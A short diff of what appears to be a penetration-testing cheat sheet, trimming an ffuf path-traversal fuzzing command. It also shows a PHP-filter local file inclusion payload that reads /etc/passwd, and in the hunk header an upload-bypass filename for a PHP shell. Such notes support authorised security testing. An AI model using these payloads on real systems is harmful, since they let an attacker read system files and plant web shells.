@@ -179,8 +179,7 @@ shell%2Ephar%00.png
 
 [*] Traversal
 ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
--w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-2>/dev/null | grep -oP '(http.*)(?<!/)$'
+-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 
 [*] LFI
 index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
